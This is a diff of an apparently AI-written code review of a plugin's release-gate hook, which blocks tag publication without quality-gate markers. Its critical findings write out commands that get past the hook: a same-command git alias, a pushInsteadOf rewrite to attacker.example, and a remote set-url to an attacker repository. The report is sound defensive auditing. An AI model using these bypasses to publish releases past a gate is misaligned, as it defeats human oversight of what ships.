@@ -1,27 +1,22 @@
 ---
 phase: 12-v0-6-0-release-candidate-review
-reviewed: 2026-05-22T19:19:41Z
+reviewed: 2026-05-23T04:08:21Z
 depth: deep
-files_reviewed: 76
+files_reviewed: 64
 files_reviewed_list:
-  - .claude-plugin/marketplace.json
   - .claude-plugin/plugin.json
   - .codex-plugin/plugin.json
-  - .github/workflows/ci.yml
+  - /Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json
   - CHANGELOG.md
   - README.md
   - agents/claude/codex-delegate.md
   - agents/claude/codex-delegate/SKILL.md
-  - agents/claude/codex-stop/SKILL.md
-  - agents/claude/forge-stop/SKILL.md
   - agents/claude/forge.md
   - agents/claude/forge/SKILL.md
   - agents/claude/forge:delegate/SKILL.md
   - agents/claude/kay:delegate/SKILL.md
   - agents/codex/codex-delegate.md
   - agents/codex/codex-delegate/SKILL.md
-  - agents/codex/codex-stop/SKILL.md
-  - agents/codex/forge-stop/SKILL.md
   - agents/codex/forge.md
   - agents/codex/forge/SKILL.md
   - agents/codex/forge:delegate/SKILL.md
@@ -47,13 +42,9 @@ files_reviewed_list:
   - site/help/troubleshooting/index.html
   - site/help/workflows/index.html
   - site/index.html
-  - site/internal/codex-command-packaging-guide.md
   - site/internal/pre-release-quality-gate.md
-  - site/knowledge/2026-04.md
   - site/pre-release-quality-gate.md
   - skills/codex-delegate/SKILL.md
-  - skills/codex-stop/SKILL.md
-  - skills/forge-stop/SKILL.md
   - skills/forge/SKILL.md
   - tests/post_release_cleanup.bash
   - tests/run_all.bash
@@ -66,8 +57,6 @@ files_reviewed_list:
   - tests/test_codex_enforcer_hook.bash
   - tests/test_codex_marketplace_manifest.bash
   - tests/test_codex_marketplace_release_gate.bash
-  - tests/test_codex_plugin_manifest.bash
-  - tests/test_codex_skill.bash
   - tests/test_docs_contract.bash
   - tests/test_forge_skill.bash
   - tests/test_help_site_navigation.bash
@@ -75,147 +64,135 @@ files_reviewed_list:
   - tests/test_host_surface_rewrite.bash
   - tests/test_install_sh.bash
   - tests/test_legacy_hook_scrub.bash
-  - tests/test_plugin_integrity.bash
   - tests/test_post_release_cleanup.bash
   - tests/test_repo_layout.bash
   - tests/test_runner_contract.bash
   - tests/test_validate_release_gate_hook.bash
 findings:
-  critical: 1
+  critical: 3
   warning: 2
-  info: 0
-  total: 3
+  info: 1
+  total: 6
 status: issues_found
 ---
 
 # Phase 12: Code Review Report
 
-## Current Release-Candidate Evidence (2026-05-23)
-
-This follow-up supersedes the stale `4cc412e81c826552f7299e638f8822756610a367` evidence below for current v0.6.0 release preparation. Implementation evidence is current through `35e2b472deed`.
-
-Reviewer follow-up fixes landed:
-
-- Release source provenance now rejects foreign-checkout `gh release`, `gh api`, and `git push` attempts even when the command names a valid Sidekick target SHA.
-- Git tag publication now checks the effective push destination, including persistent `pushInsteadOf` and `insteadOf` URL rewrites, before allowing same-repo release pushes.
-- Public release docs now show two Codex live release-pyramid runs, keep Forge live testing optional, and use a release-notes file placeholder instead of the full changelog.
-
-Verification performed against the tested implementation tree:
-
-- `bash -n hooks/validate-release-gate.sh` passed.
-- `bash -n tests/test_validate_release_gate_hook.bash` passed.
-- `bash tests/test_validate_release_gate_hook.bash` passed with `376 passed, 0 failed`.
-- `bash tests/test_plugin_integrity.bash` passed with `85 passed, 0 failed`.
-- `bash tests/test_docs_contract.bash` passed with `96 passed, 0 failed`.
-- `bash tests/test_runner_contract.bash` passed with `39 passed, 0 failed`.
-- `git diff --check` passed.
-- `bash tests/run_unit.bash` passed with `ALL STRICT NON-LIVE SUITES PASSED`.
-
-Because release markers are scoped to the current session and exact final commit SHA, all four stage markers and both live-pyramid markers must still be regenerated after this planning-only state commit before tag publication.
-
-**Reviewed:** 2026-05-22T19:19:41Z
+**Reviewed:** 2026-05-23T04:08:21Z
 **Depth:** deep
-**Files Reviewed:** 76
+**Files Reviewed:** 64
 **Status:** issues_found
 
 ## Summary
 
-Reviewed the full release diff `v0.5.8..4cc412e81c826552f7299e638f8822756610a367` for Sidekick Stage 1 pre-release blockers. The strict non-live suite passed in an isolated temp checkout, but the release is still blocked by a clean-reinstall deletion risk and two release-process contract defects.
+Reviewed the v0.6.0 release-gate diff `origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2`, with extra inspection of the public Codex marketplace pin at `/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json`.
+
+The marketplace pin is current (`version=0.6.0`, `ref=a5552f2631564efc1fc782ddded06dd8f4eadfb2`) and the sampled plugin integrity hashes match the manifest. The release gate is still not release-safe: there are fail-open paths around same-command Git config/alias mutation and local ref based GitHub release target resolution.
 
 Verification performed:
-- `git diff --stat v0.5.8..4cc412e81c826552f7299e638f8822756610a367`
-- `git diff v0.5.8..4cc412e81c826552f7299e638f8822756610a367`
-- `git diff --check v0.5.8..4cc412e81c826552f7299e638f8822756610a367` passed.
-- In a temp checkout of `4cc412e81c826552f7299e638f8822756610a367`, `HOME=<temp> bash tests/run_unit.bash` passed all strict non-live suites.
-- An isolated clean-reinstall probe showed an out-of-home Sidekick-shaped cache directory was deleted and the installer exited 0.
+- `bash -n` on changed shell scripts passed.
+- `python3 -m py_compile scripts/render-agent-bundle.py hooks/scrub-legacy-user-hooks.py` passed.
+- `git diff --check origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2` passed.
+- `bash tests/test_validate_release_gate_hook.bash` passed (`388 passed, 0 failed`), but one passing scenario encodes a stale-tag behavior that violates the release requirement.
+- `CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash` failed because the checkout is dirty (`?? ~/`).
 
 ## Narrative Findings (AI reviewer)
 
 ## Critical Issues
 
-### CR-01 [CRITICAL]: Clean reinstall can delete Sidekick-shaped cache roots outside the active host home
+### CR-01: Same-command Git alias config bypasses the release hook entirely
 
-**File:** `install.sh:684`
+**File:** `hooks/validate-release-gate.sh:4109`
 
-**Issue:** `validate_clean_reinstall_cache_target` only checks that `plugin_root_dir` contains `/.codex/plugins/cache/` or `/.claude/plugins/cache/`, ends in `/sidekick`, and that the target leaf is version-like. It does not resolve the path or require it to live under the current host home. The destructive call at `install.sh:728` then runs `rm -rf "${plugin_root_dir}"`.
-
-I verified this with an isolated temp run: `HOME` pointed at one temp directory, `CODEX_PLUGIN_ROOT` pointed at a different temp tree shaped like `.../.codex/plugins/cache/market/sidekick/v0.6.0`, and `SIDEKICK_CLEAN_REINSTALL=1` deleted the existing `sidekick` cache directory while exiting 0. In real use, a stale or malformed host root can therefore remove another cache tree that merely matches the path pattern.
-
-**Impact:** Release safety regression. Clean reinstall is explicitly supposed to avoid arbitrary host/user-root deletion; this implementation can delete outside the active host home if the host root env is stale, symlinked through another tree, or otherwise malformed.
-
-**Fix:** Resolve and constrain the deletion target before `rm -rf`. Require the resolved `plugin_root_dir` to be inside the active host's cache root under `$HOME`, reject symlinked/intermediate paths resolving outside that root, and add a regression that seeds a keep file outside `$HOME` and proves clean reinstall refuses before deletion.
+**Issue:** Git alias expansion is checked only from persistent aliases and command-scoped `git -c alias.*` values. A same-command alias written through `git config alias.*` is not classified as a release command before the later alias invocation. A command shaped like:
 
 ```bash
-host_cache_root_for_clean_reinstall() {
-  case "$1" in
-    codex) printf '%s/.codex/plugins/cache\n' "$HOME" ;;
-    claude) printf '%s/.claude/plugins/cache\n' "$HOME" ;;
-    *) return 1 ;;
-  esac
-}
-
-cache_root="$(host_cache_root_for_clean_reinstall "$host")"
-real_cache_root="$(realpath "$cache_root" 2>/dev/null || python3 -c 'from pathlib import Path; import sys; print(Path(sys.argv[1]).resolve(strict=False))' "$cache_root")"
-real_plugin_root="$(realpath "$plugin_root_dir" 2>/dev/null || python3 -c 'from pathlib import Path; import sys; print(Path(sys.argv[1]).resolve(strict=False))' "$plugin_root_dir")"
-
-case "${real_plugin_root}/" in
-  "${real_cache_root}/"*/sidekick/) ;;
-  *) echo "[forge-plugin] ERROR: Refusing clean reinstall outside active ${host} cache: ${plugin_root_dir}" >&2; return 1 ;;
-esac
+git config alias.ship 'push origin HEAD:refs/tags/v1.2.1' && git ship
 ```
+
+publishes a release tag when executed, but the hook currently emits no deny decision even with no quality-gate markers.
+
+**Impact:** A release-tag publication can bypass all four stage markers and both live-pyramid markers.
+
+**Fix:** Treat `git config alias.*`, `git config --add alias.*`, and `git config --replace-all alias.*` as release-sensitive config mutations. Recursively inspect the configured alias payload; if it could publish a release tag, require the gate and mark later same-command alias execution as unresolvable. Add a regression for the command above with no markers and with valid markers.
+
+### CR-02: Same-command Git URL/remote rewrites are ignored before tag publication
+
+**File:** `hooks/validate-release-gate.sh:5617`
+
+**Issue:** Release target metadata tracks only prior `git tag` and `git update-ref` mutations. It does not track prior `git config url.*`, `git config remote.*`, or `git remote set-url` mutations in the same Bash command. With valid markers for `HEAD`, commands such as:
+
+```bash
+git config url.https://attacker.example/alo-exp/sidekick/.pushInsteadOf https://github.com/alo-exp/sidekick &&
+git push https://github.com/alo-exp/sidekick.git HEAD:refs/tags/v1.2.1
+```
+
+and:
+
+```bash
+git remote set-url --push origin https://github.com/attacker/other.git &&
+git push origin HEAD:refs/tags/v1.2.1
+```
+
+pass the hook because validation reads the pre-mutation config, while actual execution rewrites the push destination.
+
+**Impact:** A command can satisfy markers for the Sidekick target SHA, then publish the tag to a different repository or host in the same shell invocation.
+
+**Fix:** Maintain a `release_context_mutated` flag in the metadata pass for preceding `git config` keys under `remote.*`, `url.*`, `include.*`, `includeIf.*`, and for `git remote set-url/add/remove/rename`. If a release publication appears after such a mutation, return `unresolvable` and deny. Mirror the same guard in the classifier so unknown alias/config rewrites fail closed.
+
+### CR-03: GitHub release target SHA is resolved from local refs, not the actual remote target
+
+**File:** `hooks/validate-release-gate.sh:5727`
+
+**Issue:** `gh release create --verify-tag` and `gh release create --target <branch-or-tag>` are resolved by GitHub against the remote repository, but the hook resolves `metadata_value^{commit}` in the local checkout. The code therefore authorizes based on local tag/branch state that may be stale or unrelated to the remote ref GitHub will use.
+
+This is also locked into the tests: `tests/test_validate_release_gate_hook.bash:2250` expects a verified GitHub release with a stale local tag to pass when markers exist for that local tag.
+
+**Impact:** Markers can be present for the wrong commit. A stale local `vX.Y.Z` tag or stale local `main` branch can authorize a GitHub release whose actual remote target SHA was never reviewed or live-tested.
+
+**Fix:** For `gh release create`, fail closed unless the target is an explicit commit SHA that resolves in a trusted Sidekick checkout, or verify symbolic targets against the allowed remote with `git ls-remote --tags/--heads origin <ref>` and require the marker SHA to match that remote object. `--verify-tag` should verify the remote tag SHA, not a local tag.
 
 ## Important Issues
 
-### IM-01 [IMPORTANT]: Release docs invalidate commit-scoped markers by ordering artifact commits after the live gate
+### IM-01: Tests assert the opposite of the stale-tag fail-closed requirement
 
-**File:** `site/CICD.md:35`
+**File:** `tests/test_validate_release_gate_hook.bash:2250`
 
-**Issue:** The release flow tells maintainers to complete the 4-stage quality gate, then run the live gate twice, then update release artifacts and commit them at `site/CICD.md:43-50`. The hook now requires both stage and live-pyramid markers to match the current `HEAD` SHA. If a maintainer follows this order, the release artifact commit changes `HEAD` after the markers are written, so the release hook correctly denies tag publication and `gh release create`.
+**Issue:** The scenario named `verified gh release stale tag passes with tag target markers` expects pass-through for a stale local tag. That contradicts the release requirement that target SHA resolution fail closed for stale local tags.
 
-**Impact:** Public release instructions are internally inconsistent with the current-commit enforcement. This will either block maintainers during publication or train them to bypass the hook.
+**Impact:** The suite gives false confidence and will reject the correct fix unless the test is inverted.
 
-**Fix:** Reorder the CI/CD release flow so release metadata and integrity hashes are updated and committed before the four-stage gate and the two live-pyramid runs. Alternatively, state explicitly that all four stage markers and both live-pyramid runs must be repeated after the final release commit.
+**Fix:** Change the scenario to expect `permissionDecision=deny` unless the hook verifies the remote tag SHA and the markers match that remote SHA. Add a parallel `--target main` stale-local-branch case.
 
-```markdown
-1. Update release artifacts and commit the final release candidate.
-2. Complete the 4-stage pre-release quality gate against that exact commit.
-3. Run `SIDEKICK_LIVE_CODEX=1 bash tests/run_release.bash` twice against that same commit.
-4. Tag, push, and create the GitHub release.
-```
+### IM-02: Current release-gate marketplace check fails because the checkout is dirty
 
-### IM-02 [IMPORTANT]: `run_all.bash` is not the advertised skip-safe everything runner
+**File:** `tests/test_codex_marketplace_manifest.bash:44`
 
-**File:** `tests/run_all.bash:23`
+**Issue:** In release-gate mode the marketplace manifest test requires a clean Sidekick checkout. Running it against the requested marketplace file failed at this check because `git status --porcelain` reports an untracked `~/` directory.
 
-**Issue:** `run_all.bash` delegates to `run_unit.bash`, then runs only `test_forge_e2e.bash` and `run_live_codex_plugin_read.bash`. It omits other skip-safe live-gated scripts that are part of the release pyramid: `smoke/run_smoke.bash`, `run_live_e2e.bash`, `run_live_codex_marketplace_install.bash`, `smoke/run_codex_smoke.bash`, and `run_live_codex_e2e.bash`.
+**Impact:** Even aside from the critical hook bugs, the current workspace cannot pass the release-gate marketplace validation.
 
-**Impact:** The runner contract requested for this release says `run_all.bash` is skip-safe everything. Users running the public aggregate do not exercise most skip-safe live wrappers, even when the corresponding live env vars are set, so regressions in those wrappers only surface in `run_release.bash`.
-
-**Fix:** Either add the omitted skip-safe scripts to `run_all.bash` without recording release markers, or rename/document `run_all.bash` as a partial local sweep. To satisfy the requested contract, include the missing scripts.
+**Fix:** Remove the accidental untracked `~/` directory or explicitly commit/ignore it if it is intentional. Re-run:
 
 ```bash
-run_suite "Skip-safe Forge smoke" "${SCRIPT_DIR}/smoke/run_smoke.bash"
-run_suite "Skip-safe Forge live E2E" "run_live_e2e.bash"
-run_suite "Skip-safe Kay marketplace install" "run_live_codex_marketplace_install.bash"
-run_suite "Skip-safe Kay smoke" "${SCRIPT_DIR}/smoke/run_codex_smoke.bash"
-run_suite "Skip-safe Kay live E2E" "run_live_codex_e2e.bash"
+CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json \
+SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash
 ```
 
-## Positive Observations
+## Minor Issues
 
-- Host-facing manifests now point to generated `agents/claude/` and `agents/codex/` skill roots, while canonical sources remain under `skills/`.
-- The release hook now enforces current-session and current-commit stage/live markers, and the release hook suite covers many direct, wrapped, API, GraphQL, and tag-push publication paths.
-- Kay installer metadata is read from `SOURCE_PLUGIN_ROOT`, and the unit suite includes a stale `SIDEKICK_PLUGIN_ROOT` regression.
-- Public homepage, README, manifests, and PRD overview now surface `v0.6.0`; stale `v0.5.6` state is not advertised on the main public surfaces reviewed.
+### MN-01: No regression covers same-command Git config mutation before release push
 
-## Verdict
+**File:** `tests/test_validate_release_gate_hook.bash:2405`
 
-Ready to release? No.
+**Issue:** The suite covers command-scoped `git -c url.*` rewrites and already-persistent URL rewrites, but it does not cover same-command persistent mutations such as `git config url.* && git push` or `git remote set-url && git push`.
 
-Release should wait for the clean-reinstall deletion guard and the release-process contract fixes above.
+**Impact:** The CR-02 fail-open path was able to ship despite extensive release-hook coverage.
+
+**Fix:** Add tests that seed valid current markers and still expect deny for same-command URL/remote mutation before a tag push.
 
 ---
 
-_Reviewed: 2026-05-22T19:19:41Z_
-_Reviewer: the agent (gsd-code-reviewer)_
-_Depth: deep_
+STATUS: success
+ACCEPTED_FINDINGS: 5
+ASSESSMENT: blocked
